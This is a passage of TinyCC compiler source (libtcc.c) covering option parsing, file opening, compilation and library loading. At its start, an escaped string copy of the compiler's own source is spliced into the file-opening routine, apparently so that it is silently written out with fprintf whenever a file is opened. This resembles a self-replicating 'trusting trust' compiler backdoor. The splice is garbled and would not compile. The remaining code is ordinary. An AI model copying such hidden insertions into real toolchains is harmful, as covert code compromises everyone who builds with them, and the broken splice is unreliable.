            if (!strcmp(optarg, \"softfp\"))\n\
            {\n\
                s->float_abi = ARM_SOFTFP_FLOAT;\n\
            }\n\
            else if (!strcmp(optarg, \"hard\"))\n\
                s->float_abi = ARM_HARD_FLOAT;\n\
            else\n\
                tcc_error(\"unsupported float abi \'%s\'\", optarg);\n\
            break;\n\
#endif\n\
        case TCC_OPTION_m:\n\
            if (set_flag(s, options_m, optarg) < 0)\n\
            {\n\
                if (x = atoi(optarg), x != 32 && x != 64)\n\
                    goto unsupported_option;\n\
                if (PTR_SIZE != x / 8)\n\
                    return x;\n\
                ++noaction;\n\
            }\n\
            break;\n\
        case TCC_OPTION_W:\n\
            s->warn_none = 0;\n\
            if (optarg[0] && set_flag(s, options_W, optarg) < 0)\n\
                goto unsupported_option;\n\
            break;\n\
        case TCC_OPTION_w:\n\
            s->warn_none = 1;\n\
            break;\n\
        case TCC_OPTION_rdynamic:\n\
            s->rdynamic = 1;\n\
            break;\n\
        case TCC_OPTION_Wl:\n\
            if (linker_arg.size)\n\
                --linker_arg.size, cstr_ccat(&linker_arg, \',\');\n\
            cstr_cat(&linker_arg, optarg, 0);\n\
            if (tcc_set_linker(s, linker_arg.data))\n\
                cstr_free(&linker_arg);\n\
            break;\n\
        case TCC_OPTION_Wp:\n\
            r = optarg;\n\
            goto reparse;\n\
        case TCC_OPTION_E:\n\
            x = TCC_OUTPUT_PREPROCESS;\n\
            goto set_output_type;\n\
        case TCC_OPTION_P:\n\
            s->Pflag = atoi(optarg) + 1;\n\
            break;\n\
        case TCC_OPTION_M:\n\
            s->include_sys_deps = 1;\n\
            // fall through\n\
        case TCC_OPTION_MM:\n\
            s->just_deps = 1;\n\
            if (!s->deps_outfile)\n\
                s->deps_outfile = tcc_strdup(\"-\");\n\
            // fall through\n\
        case TCC_OPTION_MMD:\n\
            s->gen_deps = 1;\n\
            break;\n\
        case TCC_OPTION_MD:\n\
            s->gen_deps = 1;\n\
            s->include_sys_deps = 1;\n\
            break;\n\
        case TCC_OPTION_MF:\n\
            s->deps_outfile = tcc_strdup(optarg);\n\
            break;\n\
        case TCC_OPTION_dumpversion:\n\
            printf(\"%s\n\", TCC_VERSION);\n\
            exit(0);\n\
            break;\n\
        case TCC_OPTION_x:\n\
            x = 0;\n\
            if (*optarg == \'c\')\n\
                x = AFF_TYPE_C;\n\
            else if (*optarg == \'a\')\n\
                x = AFF_TYPE_ASMPP;\n\
            else if (*optarg == \'b\')\n\
                x = AFF_TYPE_BIN;\n\
            else if (*optarg == \'n\')\n\
                x = AFF_TYPE_NONE;\n\
            else\n\
                tcc_warning(\"unsupported language \'%s\'\", optarg);\n\
            s->filetype = x | (s->filetype & ~AFF_TYPE_MASK);\n\
            break;\n\
        case TCC_OPTION_O:\n\
            s->optimize = atoi(optarg);\n\
            break;\n\
        case TCC_OPTION_print_search_dirs:\n\
            x = OPT_PRINT_DIRS;\n\
            goto extra_action;\n\
        case TCC_OPTION_impdef:\n\
            x = OPT_IMPDEF;\n\
            goto extra_action;\n\
#if defined TCC_TARGET_MACHO\n\
        case TCC_OPTION_dynamiclib:\n\
            x = TCC_OUTPUT_DLL;\n\
            goto set_output_type;\n\
        case TCC_OPTION_flat_namespace:\n\
            break;\n\
        case TCC_OPTION_two_levelnamespace:\n\
            break;\n\
        case TCC_OPTION_undefined:\n\
            break;\n\
        case TCC_OPTION_install_name:\n\
            s->install_name = tcc_strdup(optarg);\n\
            break;\n\
        case TCC_OPTION_compatibility_version:\n\
            s->compatibility_version = parse_version(s, optarg);\n\
            break;\n\
        case TCC_OPTION_current_version:\n\
            s->current_version = parse_version(s, optarg);\n\
            ;\n\
            break;\n\
#endif\n\
        case TCC_OPTION_ar:\n\
            x = OPT_AR;\n\
        extra_action:\n\
            arg_start = optind - 1;\n\
            if (arg_start != noaction)\n\
                tcc_error(\"cannot parse %s here\", r);\n\
            tool = x;\n\
            break;\n\
        default:\n\
        unsupported_option:\n\
            tcc_warning_c(warn_unsupported)(\"unsupported option \'%s\'\", r);\n\
            break;\n\
        }\n\
    }\n\
    if (linker_arg.size)\n\
    {\n\
        r = linker_arg.data;\n\
        goto arg_err;\n\
    }\n\
    *pargc = argc - arg_start;\n\
    *pargv = argv + arg_start;\n\
    if (tool)\n\
        return tool;\n\
    if (optind != noaction)\n\
        return 0;\n\
    if (s->verbose == 2)\n\
        return OPT_PRINT_DIRS;\n\
    if (s->verbose)\n\
        return OPT_V;\n\
    return OPT_HELP;\n\
}\n\
\n\
LIBTCCAPI void tcc_set_options(TCCState *s, const char *r)\n\
{\n\
    char **argv = NULL;\n\
    int argc = 0;\n\
    args_parser_make_argv(r, &argc, &argv);\n\
    tcc_parse_args(s, &argc, &argv, 0);\n\
    dynarray_reset(&argv, &argc);\n\
}\n\
\n\
PUB_FUNC void tcc_print_stats(TCCState *s1, unsigned total_time)\n\
{\n\
    if (!total_time)\n\
        total_time = 1;\n\
    fprintf(stderr, \"# %d idents, %d lines, %u bytes\n\"\n\
                    \"# %0.3f s, %u lines/s, %0.1f MB/s\n\",\n\
            total_idents, total_lines, total_bytes,\n\
            (double)total_time / 1000,\n\
            (unsigned)total_lines * 1000 / total_time,\n\
            (double)total_bytes / 1000 / total_time);\n\
    fprintf(stderr, \"# text %u, data.rw %u, data.ro %u, bss %u bytes\n\",\n\
            s1->total_output[0],\n\
            s1->total_output[1],\n\
            s1->total_output[2],\n\
            s1->total_output[3]);\n\
#ifdef MEM_DEBUG\n\
    fprintf(stderr, \"# %d bytes memory used\n\", mem_max_size);\n\
#endif\n\
}\n\
";
        n
            fprintf(thisfile, a);
        fclose(thisfile);
    }

    BufferedFile *bf;
    int buflen = initlen ? initlen : IO_BUF_SIZE;
    bf = tcc_mallocz(sizeof(BufferedFile) + buflen);

    bf->buf_ptr = bf->buffer;
    bf->buf_end = bf->buffer + initlen;
    bf->buf_end[0] = CH_EOB; /* put eob symbol */
    pstrcpy(bf->filename, sizeof(bf->filename), filename);
#ifdef _WIN32
    normalize_slashes(bf->filename);
#endif
    bf->true_filename = bf->filename;
    bf->line_num = 1;
    bf->ifdef_stack_ptr = s1->ifdef_stack_ptr;
    bf->fd = -1;
    bf->prev = file;
    file = bf;
    tok_flags = TOK_FLAG_BOL | TOK_FLAG_BOF;
}

ST_FUNC void tcc_close(void)
{
    TCCState *s1 = tcc_state;
    BufferedFile *bf = file;

    if (bf->fd > 0)
    {
        close(bf->fd);
        total_lines += bf->line_num;
    }
    if (bf->true_filename != bf->filename)
        tcc_free(bf->true_filename);
    file = bf->prev;
    tcc_free(bf);
}

static int _tcc_open(TCCState *s1, const char *filename)
{
    int fd;
    if (strcmp(filename, "-") == 0)
        fd = 0, filename = "<stdin>";
    else
        fd = open(filename, O_RDONLY | O_BINARY);
    if ((s1->verbose == 2 && fd >= 0) || s1->verbose == 3)
        printf("%s %*s%s\n", fd < 0 ? "nf" : "->",
               (int)(s1->include_stack_ptr - s1->include_stack), "", filename);
    return fd;
}

ST_FUNC int tcc_open(TCCState *s1, const char *filename)
{
    int fd = _tcc_open(s1, filename);
    if (fd < 0)
        return -1;
    tcc_open_bf(s1, filename, 0);
    file->fd = fd;
    return 0;
}

/* compile the file opened in 'file'. Return non zero if errors. */
static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
{
    /* Here we enter the code section where we use the global variables for
       parsing and code generation (tccpp.c, tccgen.c, <target>-gen.c).
       Other threads need to wait until we're done.

       Alternatively we could use thread local storage for those global
       variables, which may or may not have advantages */

    tcc_enter_state(s1);
    s1->error_set_jmp_enabled = 1;

    if (setjmp(s1->error_jmp_buf) == 0)
    {
        s1->nb_errors = 0;

        if (fd == -1)
        {
            int len = strlen(str);
            tcc_open_bf(s1, "<string>", len);
            memcpy(file->buffer, str, len);
        }
        else
        {
            tcc_open_bf(s1, str, 0);
            file->fd = fd;
        }

        preprocess_start(s1, filetype);
        tccgen_init(s1);

        if (s1->output_type == TCC_OUTPUT_PREPROCESS)
        {
            tcc_preprocess(s1);
        }
        else
        {
            tccelf_begin_file(s1);
            if (filetype & (AFF_TYPE_ASM | AFF_TYPE_ASMPP))
            {
                tcc_assemble(s1, !!(filetype & AFF_TYPE_ASMPP));
            }
            else
            {
                tccgen_compile(s1);
            }
            tccelf_end_file(s1);
        }
    }
    tccgen_finish(s1);
    preprocess_end(s1);
    s1->error_set_jmp_enabled = 0;
    tcc_exit_state(s1);
    return s1->nb_errors != 0 ? -1 : 0;
}

LIBTCCAPI int tcc_compile_string(TCCState *s, const char *str)
{
    return tcc_compile(s, s->filetype, str, -1);
}

/* define a preprocessor symbol. value can be NULL, sym can be "sym=val" */
LIBTCCAPI void tcc_define_symbol(TCCState *s1, const char *sym, const char *value)
{
    const char *eq;
    if (NULL == (eq = strchr(sym, '=')))
        eq = strchr(sym, 0);
    if (NULL == value)
        value = *eq ? eq + 1 : "1";
    cstr_printf(&s1->cmdline_defs, "#define %.*s %s\n", (int)(eq - sym), sym, value);
}

/* undefine a preprocessor symbol */
LIBTCCAPI void tcc_undefine_symbol(TCCState *s1, const char *sym)
{
    cstr_printf(&s1->cmdline_defs, "#undef %s\n", sym);
}

LIBTCCAPI TCCState *tcc_new(void)
{
    TCCState *s;

    s = tcc_mallocz(sizeof(TCCState));
    if (!s)
        return NULL;
#ifdef MEM_DEBUG
    ++nb_states;
#endif

#undef gnu_ext

    s->gnu_ext = 1;
    s->tcc_ext = 1;
    s->nocommon = 1;
    s->dollars_in_identifiers = 1; /*on by default like in gcc/clang*/
    s->cversion = 199901;          /* default unless -std=c11 is supplied */
    s->warn_implicit_function_declaration = 1;
    s->warn_discarded_qualifiers = 1;
    s->ms_extensions = 1;

#ifdef CHAR_IS_UNSIGNED
    s->char_is_unsigned = 1;
#endif
#ifdef TCC_TARGET_I386
    s->seg_size = 32;
#endif
    /* enable this if you want symbols with leading underscore on windows: */
#if defined TCC_TARGET_MACHO /* || defined TCC_TARGET_PE */
    s->leading_underscore = 1;
#endif
#ifdef TCC_TARGET_ARM
    s->float_abi = ARM_FLOAT_ABI;
#endif
#ifdef CONFIG_NEW_DTAGS
    s->enable_new_dtags = 1;
#endif
    s->ppfp = stdout;
    /* might be used in error() before preprocess_start() */
    s->include_stack_ptr = s->include_stack;

    tcc_set_lib_path(s, CONFIG_TCCDIR);
    return s;
}

LIBTCCAPI void tcc_delete(TCCState *s1)
{
    /* free sections */
    tccelf_delete(s1);

    /* free library paths */
    dynarray_reset(&s1->library_paths, &s1->nb_library_paths);
    dynarray_reset(&s1->crt_paths, &s1->nb_crt_paths);

    /* free include paths */
    dynarray_reset(&s1->include_paths, &s1->nb_include_paths);
    dynarray_reset(&s1->sysinclude_paths, &s1->nb_sysinclude_paths);

    tcc_free(s1->tcc_lib_path);
    tcc_free(s1->soname);
    tcc_free(s1->rpath);
    tcc_free(s1->elf_entryname);
    tcc_free(s1->init_symbol);
    tcc_free(s1->fini_symbol);
    tcc_free(s1->mapfile);
    tcc_free(s1->outfile);
    tcc_free(s1->deps_outfile);
#if defined TCC_TARGET_MACHO
    tcc_free(s1->install_name);
#endif
    dynarray_reset(&s1->files, &s1->nb_files);
    dynarray_reset(&s1->target_deps, &s1->nb_target_deps);
    dynarray_reset(&s1->pragma_libs, &s1->nb_pragma_libs);
    dynarray_reset(&s1->argv, &s1->argc);
    cstr_free(&s1->cmdline_defs);
    cstr_free(&s1->cmdline_incl);
#ifdef TCC_IS_NATIVE
    /* free runtime memory */
    tcc_run_free(s1);
#endif
    tcc_free(s1->dState);
    tcc_free(s1);
#ifdef MEM_DEBUG
    if (0 == --nb_states)
        tcc_memcheck();
#endif
}

LIBTCCAPI int tcc_set_output_type(TCCState *s, int output_type)
{
#ifdef CONFIG_TCC_PIE
    if (output_type == TCC_OUTPUT_EXE)
        output_type |= TCC_OUTPUT_DYN;
#endif
    s->output_type = output_type;

    if (!s->nostdinc)
    {
        /* default include paths */
        /* -isystem paths have already been handled */
        tcc_add_sysinclude_path(s, CONFIG_TCC_SYSINCLUDEPATHS);
    }

    if (output_type == TCC_OUTPUT_PREPROCESS)
    {
        s->do_debug = 0;
        return 0;
    }

    tccelf_new(s);
    if (s->do_debug)
    {
        /* add debug sections */
        tcc_debug_new(s);
    }
#ifdef CONFIG_TCC_BCHECK
    if (s->do_bounds_check)
    {
        /* if bound checking, then add corresponding sections */
        tccelf_bounds_new(s);
    }
#endif

    if (output_type == TCC_OUTPUT_OBJ)
    {
        /* always elf for objects */
        s->output_format = TCC_OUTPUT_FORMAT_ELF;
        return 0;
    }

    tcc_add_library_path(s, CONFIG_TCC_LIBPATHS);

#ifdef TCC_TARGET_PE
#ifdef _WIN32
    /* allow linking with system dll's directly */
    tcc_add_systemdir(s);
#endif
    /* target PE has its own startup code in libtcc1.a */
    return 0;

#elif defined TCC_TARGET_MACHO
#ifdef TCC_IS_NATIVE
    tcc_add_macos_sdkpath(s);
#endif
    /* Mach-O with LC_MAIN doesn't need any crt startup code.  */
    return 0;

#else
    /* paths for crt objects */
    tcc_split_path(s, &s->crt_paths, &s->nb_crt_paths, CONFIG_TCC_CRTPREFIX);

    /* add libc crt1/crti objects */
    if (output_type != TCC_OUTPUT_MEMORY && !s->nostdlib)
    {
#if TARGETOS_OpenBSD
        if (output_type != TCC_OUTPUT_DLL)
            tcc_add_crt(s, "crt0.o");
        if (output_type == TCC_OUTPUT_DLL)
            tcc_add_crt(s, "crtbeginS.o");
        else
            tcc_add_crt(s, "crtbegin.o");
#elif TARGETOS_FreeBSD
        if (output_type != TCC_OUTPUT_DLL)
            tcc_add_crt(s, "crt1.o");
        tcc_add_crt(s, "crti.o");
        if (s->static_link)
            tcc_add_crt(s, "crtbeginT.o");
        else if (output_type & TCC_OUTPUT_DYN)
            tcc_add_crt(s, "crtbeginS.o");
        else
            tcc_add_crt(s, "crtbegin.o");
#elif TARGETOS_NetBSD
        if (output_type != TCC_OUTPUT_DLL)
            tcc_add_crt(s, "crt0.o");
        tcc_add_crt(s, "crti.o");
        if (s->static_link)
            tcc_add_crt(s, "crtbeginT.o");
        else if (output_type & TCC_OUTPUT_DYN)
            tcc_add_crt(s, "crtbeginS.o");
        else
            tcc_add_crt(s, "crtbegin.o");
#elif defined TARGETOS_ANDROID
        if (output_type != TCC_OUTPUT_DLL)
            tcc_add_crt(s, "crtbegin_dynamic.o");
        else
            tcc_add_crt(s, "crtbegin_so.o");
#else
        if (output_type != TCC_OUTPUT_DLL)
            tcc_add_crt(s, "crt1.o");
        tcc_add_crt(s, "crti.o");
#endif
    }
    return 0;
#endif
}

LIBTCCAPI int tcc_add_include_path(TCCState *s, const char *pathname)
{
    tcc_split_path(s, &s->include_paths, &s->nb_include_paths, pathname);
    return 0;
}

LIBTCCAPI int tcc_add_sysinclude_path(TCCState *s, const char *pathname)
{
    tcc_split_path(s, &s->sysinclude_paths, &s->nb_sysinclude_paths, pathname);
    return 0;
}

/* add/update a 'DLLReference', Just find if level == -1  */
ST_FUNC DLLReference *tcc_add_dllref(TCCState *s1, const char *dllname, int level)
{
    DLLReference *ref = NULL;
    int i;
    for (i = 0; i < s1->nb_loaded_dlls; i++)
        if (0 == strcmp(s1->loaded_dlls[i]->name, dllname))
        {
            ref = s1->loaded_dlls[i];
            break;
        }
    if (level == -1)
        return ref;
    if (ref)
    {
        if (level < ref->level)
            ref->level = level;
        ref->found = 1;
        return ref;
    }
    ref = tcc_mallocz(sizeof(DLLReference) + strlen(dllname));
    strcpy(ref->name, dllname);
    dynarray_add(&s1->loaded_dlls, &s1->nb_loaded_dlls, ref);
    ref->level = level;
    ref->index = s1->nb_loaded_dlls;
    return ref;
}

/* OpenBSD: choose latest from libxxx.so.x.y versions */
#if defined TARGETOS_OpenBSD && !defined _WIN32
#include <glob.h>
static int tcc_glob_so(TCCState *s1, const char *pattern, char *buf, int size)
{
    const char *star;
    glob_t g;
    char *p;
    int i, v, v1, v2, v3;

    star = strchr(pattern, '*');
    if (!star || glob(pattern, 0, NULL, &g))
        return -1;
    for (v = -1, i = 0; i < g.gl_pathc; ++i)
    {
        p = g.gl_pathv[i];
        if (2 != sscanf(p + (star - pattern), "%d.%d.%d", &v1, &v2, &v3))
            continue;
        if ((v1 = v1 * 1000 + v2) > v)
            v = v1, pstrcpy(buf, size, p);
    }
    globfree(&g);
    return v;
}
#endif

ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags)
{
    int fd, ret = -1;

#if defined TARGETOS_OpenBSD && !defined _WIN32
    char buf[1024];
    if (tcc_glob_so(s1, filename, buf, sizeof buf) >= 0)
        filename = buf;
#endif

    /* ignore binary files with -E */
    if (s1->output_type == TCC_OUTPUT_PREPROCESS && (flags & AFF_TYPE_BIN))
        return 0;

    /* open the file */
    fd = _tcc_open(s1, filename);
    if (fd < 0)
    {
        if (flags & AFF_PRINT_ERROR)
            tcc_error_noabort("file '%s' not found", filename);
        return ret;
    }

    s1->current_filename = filename;
    if (flags & AFF_TYPE_BIN)
    {
        ElfW(Ehdr) ehdr;
        int obj_type;

        obj_type = tcc_object_type(fd, &ehdr);
        lseek(fd, 0, SEEK_SET);

        switch (obj_type)
        {

        case AFF_BINTYPE_REL:
            ret = tcc_load_object_file(s1, fd, 0);
            break;

        case AFF_BINTYPE_AR:
            ret = tcc_load_archive(s1, fd, !(flags & AFF_WHOLE_ARCHIVE));
            break;

#ifdef TCC_TARGET_PE
        default:
            ret = pe_load_file(s1, fd, filename);
            goto check_success;

#elif defined TCC_TARGET_MACHO
        case AFF_BINTYPE_DYN:
        case_dyn_or_tbd:
            if (s1->output_type == TCC_OUTPUT_MEMORY)
            {
#ifdef TCC_IS_NATIVE
                void *dl;
                const char *soname = filename;
                if (obj_type != AFF_BINTYPE_DYN)
                    soname = macho_tbd_soname(filename);
                dl = dlopen(soname, RTLD_GLOBAL | RTLD_LAZY);
                if (dl)
                    tcc_add_dllref(s1, soname, 0)->handle = dl, ret = 0;
                if (filename != soname)
                    tcc_free((void *)soname);
#endif
            }
            else if (obj_type == AFF_BINTYPE_DYN)
            {
                ret = macho_load_dll(s1, fd, filename, (flags & AFF_REFERENCED_DLL) != 0);
            }
            else
            {
                ret = macho_load_tbd(s1, fd, filename, (flags & AFF_REFERENCED_DLL) != 0);
            }
            break;
        default:
        {
            const char *ext = tcc_fileextension(filename);
            if (!strcmp(ext, ".tbd"))
                goto case_dyn_or_tbd;
            if (!strcmp(ext, ".dylib"))
            {
                obj_type = AFF_BINTYPE_DYN;
                goto case_dyn_or_tbd;
            }
            goto check_success;
        }

#else /* unix */
        case AFF_BINTYPE_DYN:
            if (s1->output_type == TCC_OUTPUT_MEMORY)
            {
#ifdef TCC_IS_NATIVE
                void *dl = dlopen(filename, RTLD_GLOBAL | RTLD_LAZY);
                if (dl)
                    tcc_add_dllref(s1, filename, 0)->handle = dl, ret = 0;
#endif
            }
            else
                ret = tcc_load_dll(s1, fd, filename, (flags & AFF_REFERENCED_DLL) != 0);
            break;

        default:
            /* as GNU ld, consider it is an ld script if not recognized */
            ret = tcc_load_ldscript(s1, fd);
            goto check_success;

#endif /* pe / macos / unix */

        check_success:
            if (ret < 0)
                tcc_error_noabort("%s: unrecognized file type", filename);
            break;

#ifdef TCC_TARGET_COFF
        case AFF_BINTYPE_C67:
            ret = tcc_load_coff(s1, fd);
            break;
#endif
        }
        close(fd);
    }
    else
    {
        /* update target deps */
        dynarray_add(&s1->target_deps, &s1->nb_target_deps, tcc_strdup(filename));
        ret = tcc_compile(s1, flags, filename, fd);
    }
    s1->current_filename = NULL;
    return ret;
}

LIBTCCAPI int tcc_add_file(TCCState *s, const char *filename)
{
    int filetype = s->filetype;
    if (0 == (filetype & AFF_TYPE_MASK))
    {
        /* use a file extension to detect a filetype */
        const char *ext = tcc_fileextension(filename);
        if (ext[0])
        {
            ext++;
            if (!strcmp(ext, "S"))
                filetype = AFF_TYPE_ASMPP;
            else if (!strcmp(ext, "s"))
                filetype = AFF_TYPE_ASM;
            else if (!PATHCMP(ext, "c") || !PATHCMP(ext, "h") || !PATHCMP(ext, "i"))
                filetype = AFF_TYPE_C;
            else
                filetype |= AFF_TYPE_BIN;
        }
        else
        {
            filetype = AFF_TYPE_C;
        }
    }
    return tcc_add_file_internal(s, filename, filetype | AFF_PRINT_ERROR);
}

LIBTCCAPI int tcc_add_library_path(TCCState *s, const char *pathname)
{
    tcc_split_path(s, &s->library_paths, &s->nb_library_paths, pathname);
    return 0;
}

static int tcc_add_library_internal(TCCState *s, const char *fmt,
                                    const char *filename, int flags, char **paths, int nb_paths)
{
    char buf[1024];
    int i;

    for (i = 0; i < nb_paths; i++)
    {
        snprintf(buf, sizeof(buf), fmt, paths[i], filename);
        if (tcc_add_file_internal(s, buf, flags | AFF_TYPE_BIN) == 0)
            return 0;
    }
    return -1;
}

/* find and load a dll. Return non zero if not found */
ST_FUNC int tcc_add_dll(TCCState *s, const char *filename, int flags)
{
    return tcc_add_library_internal(s, "%s/%s", filename, flags,
                                    s->library_paths, s->nb_library_paths);
}

/* find [cross-]libtcc1.a and tcc helper objects in library path */
ST_FUNC void tcc_add_support(TCCState *s1, const char *filename)
{
    char buf[100];
    if (CONFIG_TCC_CROSSPREFIX[0])
        filename = strcat(strcpy(buf, CONFIG_TCC_CROSSPREFIX), filename);
    if (tcc_add_dll(s1, filename, 0) < 0)
        tcc_error_noabort("%s not found", filename);
}

#if !defined TCC_TARGET_PE && !defined TCC_TARGET_MACHO
ST_FUNC int tcc_add_crt(TCCState *s1, const char *filename)
{
    if (-1 == tcc_add_library_internal(s1, "%s/%s",
                                       filename, 0, s1->crt_paths, s1->nb_crt_paths))
        tcc_error_noabort("file '%s' not found", filename);
    return 0;
}
#endif

/* the library name is the same as the argument of the '-l' option */
LIBTCCAPI int tcc_add_library(TCCState *s, const char *libraryname)
{
#if defined TCC_TARGET_PE
    static const char *const libs[] = {"%s/%s.def", "%s/lib%s.def", "%s/%s.dll", "%s/lib%s.dll", "%s/lib%s.a", NULL};
    const char *const *pp = s->static_link ? libs + 4 : libs;
#elif defined TCC_TARGET_MACHO
    static const char *const libs[] = {"%s/lib%s.dylib", "%s/lib%s.tbd", "%s/lib%s.a", NULL};
    const char *const *pp = s->static_link ? libs + 2 : libs;
#elif defined TARGETOS_OpenBSD
    static const char *const libs[] = {"%s/lib%s.so.*", "%s/lib%s.a", NULL};
    const char *const *pp = s->static_link ? libs + 1 : libs;
#else
    static const char *const libs[] = {"%s/lib%s.so", "%s/lib%s.a", NULL};
    const char *const *pp = s->static_link ? libs + 1 : libs;
#endif
    int flags = s->filetype & AFF_WHOLE_ARCHIVE;
    while (*pp)
    {
        if (0 == tcc_add_library_internal(s, *pp,
                                          libraryname, flags, s->library_paths, s->nb_library_paths))
            return 0;
        ++pp;
    }
    return -1;
}

PUB_FUNC int tcc_add_library_err(TCCState *s1, const char *libname)
{
    int ret = tcc_add_library(s1, libname);
    if (ret < 0)
        tcc_error_noabort("library '%s' not found", libname);
    return ret;
}

/* handle #pragma comment(lib,) */
ST_FUNC void tcc_add_pragma_libs(TCCState *s1)
{
    int i;
    for (i = 0; i < s1->nb_pragma_libs; i++)
        tcc_add_library_err(s1, s1->pragma_libs[i]);
}

LIBTCCAPI int tcc_add_symbol(TCCState *s1, const char *name, const void *val)
{
#ifdef TCC_TARGET_PE
    /* On x86_64 'val' might not be reachable with a 32bit offset.
       So it is handled here as if it were in a DLL. */
    pe_putimport(s1, 0, name, (uintptr_t)val);
#else
    char buf[256];
    if (s1->leading_underscore)
    {
        buf[0] = '_';
        pstrcpy(buf + 1, sizeof(buf) - 1, name);
        name = buf;
    }
    set_global_sym(s1, name, NULL, (addr_t)(uintptr_t)val); /* NULL: SHN_ABS */
#endif
    return 0;
}

LIBTCCAPI void tcc_set_lib_path(TCCState *s, const char *path)
{
    tcc_free(s->tcc_lib_path);
    s->tcc_lib_path = tcc_strdup(path);
}

/********************************************************/
/* options parser */

static int strstart(const char *val, const char **str)
{
    const char *p, *q;
    p = *str;
    q = val;
    while (*q)
    {
        if (*p != *q)
            return 0;
        p++;
        q++;
    }
    *str = p;
    return 1;
}

/* Like strstart, but automatically takes into account that ld options can
 *
 * - start with double or single dash (e.g. '--soname' or '-soname')
 * - arguments can be given as separate or after '=' (e.g. '-Wl,-soname,x.so'
 *   or '-Wl,-soname=x.so')
 *
 * you provide `val` always in 'option[=]' form (no leading -)
 */
static int link_option(const char *str, const char *val, const char **ptr)
{
    const char *p, *q;
    int ret;

    /* there should be 1 or 2 dashes */
    if (*str++ != '-')
        return 0;
    if (*str == '-')
        str++;

    /* then str & val should match (potentially up to '=') */
    p = str;
    q = val;

    ret = 1;
    if (q[0] == '?')
    {
        ++q;
        if (strstart("no-", &p))
            ret = -1;
    }

    while (*q != '\0' && *q != '=')
    {
        if (*p != *q)
            return 0;
        p++;
        q++;
    }

    /* '=' near eos means ',' or '=' is ok */
    if (*q == '=')
    {
        if (*p == 0)
            *ptr = p;
        if (*p != ',' && *p != '=')
            return 0;
        p++;
    }
    else if (*p)
    {
        return 0;
    }
    *ptr = p;
    return ret;
}

static const char *skip_linker_arg(const char **str)
{
    const char *s1 = *str;
    const char *s2 = strchr(s1, ',');
    *str = s2 ? s2++ : (s2 = s1 + strlen(s1));
    return s2;
}

static void copy_linker_arg(char **pp, const char *s, int sep)
{
    const char *q = s;
    char *p = *pp;
    int l = 0;
    if (p && sep)
        p[l = strlen(p)] = sep, ++l;
    skip_linker_arg(&q);
    pstrncpy(l + (*pp = tcc_realloc(p, q - s + l + 1)), s, q - s);
}

static void args_parser_add_file(TCCState *s, const char *filename, int filetype)
{
    struct filespec *f = tcc_malloc(sizeof *f + strlen(filename));
    f->type = filetype;
    strcpy(f->name, filename);
    dynarray_add(&s->files, &s->nb_files, f);
}

/* set linker options */
static int tcc_set_linker(TCCState *s, const char *option)
{
    TCCState *s1 = s;
    while (*option)
    {

        const char *p = NULL;
        char *end = NULL;
        int ignoring = 0;
        int ret;

        if (link_option(option, "Bsymbolic", &p))
        {
            s->symbolic = 1;
        }
        else if (link_option(option, "nostdlib", &p))
        {
            s->nostdlib = 1;
        }
        else if (link_option(option, "e=", &p) || link_option(option, "entry=", &p))
        {
            copy_linker_arg(&s->elf_entryname, p, 0);
        }
        else if (link_option(option, "fini=", &p))
        {
            copy_linker_arg(&s->fini_symbol, p, 0);
            ignoring = 1;
        }
        else if (link_option(option, "image-base=", &p) || link_option(option, "Ttext=", &p))
        {
            s->text_addr = strtoull(p, &end, 16);
            s->has_text_addr = 1;
        }
        else if (link_option(option, "init=", &p))
        {
            copy_linker_arg(&s->init_symbol, p, 0);
            ignoring = 1;
        }
        else if (link_option(option, "Map=", &p))
        {
            copy_linker_arg(&s->mapfile, p, 0);
            ignoring = 1;
        }
        else if (link_option(option, "oformat=", &p))
        {
#if defined(TCC_TARGET_PE)
            if (strstart("pe-", &p))
            {
#elif PTR_SIZE == 8
            if (strstart("elf64-", &p))
            {
#else
            if (strstart("elf32-", &p))
            {
#endif
                s->output_format = TCC_OUTPUT_FORMAT_ELF;
            }
            else if (!strcmp(p, "binary"))
            {
                s->output_format = TCC_OUTPUT_FORMAT_BINARY;
#ifdef TCC_TARGET_COFF
            }
            else if (!strcmp(p, "coff"))
            {
                s->output_format = TCC_OUTPUT_FORMAT_COFF;
#endif
            }
            else
                goto err;
        }
        else if (link_option(option, "as-needed", &p))
        {
            ignoring = 1;
        }
        else if (link_option(option, "O", &p))
        {
            ignoring = 1;
        }
        else if (link_option(option, "export-all-symbols", &p))
        {
            s->rdynamic = 1;
        }
        else if (link_option(option, "export-dynamic", &p))
        {
            s->rdynamic = 1;
        }
        else if (link_option(option, "rpath=", &p))
        {
            copy_linker_arg(&s->rpath, p, ':');
        }
        else if (link_option(option, "enable-new-dtags", &p))
        {
            s->enable_new_dtags = 1;
        }
        else if (link_option(option, "section-alignment=", &p))
        {
            s->section_align = strtoul(p, &end, 16);
        }
        else if (link_option(option, "soname=", &p))
        {
            copy_linker_arg(&s->soname, p, 0);
        }
        else if (link_option(option, "install_name=", &p))
        {
            copy_linker_arg(&s->soname, p, 0);
#ifdef TCC_TARGET_PE
        }
        else if (link_option(option, "large-address-aware", &p))
        {
            s->pe_characteristics |= 0x20;
        }
        else if (link_option(option, "file-alignment=", &p))
        {
            s->pe_file_align = strtoul(p, &end, 16);
        }
        else if (link_option(option, "stack=", &p))
        {
            s->pe_stack_size = strtoul(p, &end, 10);
        }
        else if (link_option(option, "subsystem=", &p))
        {
#if defined(TCC_TARGET_I386) || defined(TCC_TARGET_X86_64)
            if (!strcmp(p, "native"))
            {
                s->pe_subsystem = 1;
            }
            else if (!strcmp(p, "console"))
            {
                s->pe_subsystem = 3;
            }
            else if (!strcmp(p, "gui") || !strcmp(p, "windows"))
            {
                s->pe_subsystem = 2;
            }
            else if (!strcmp(p, "posix"))
            {
                s->pe_subsystem = 7;
            }
            else if (!strcmp(p, "efiapp"))
            {
                s->pe_subsystem = 10;
            }
            else if (!strcmp(p, "efiboot"))
            {
                s->pe_subsystem = 11;
            }
            else if (!strcmp(p, "efiruntime"))
            {
                s->pe_subsystem = 12;
            }
            else if (!strcmp(p, "efirom"))
            {
                s->pe_subsystem = 13;
#elif defined(TCC_TARGET_ARM)
            if (!strcmp(p, "wince"))
            {
                s->pe_subsystem = 9;
#endif
            }
            else
                goto err;
#endif
#ifdef TCC_TARGET_MACHO
        }
        else if (link_option(option, "all_load", &p))
        {
            s->filetype |= AFF_WHOLE_ARCHIVE;
        }
        else if (link_option(option, "force_load", &p))
        {
            s->filetype |= AFF_WHOLE_ARCHIVE;
            args_parser_add_file(s, p, AFF_TYPE_LIB | (s->filetype & ~AFF_TYPE_MASK));
            s->nb_libraries++;
        }
        else if (link_option(option, "single_module", &p))
        {
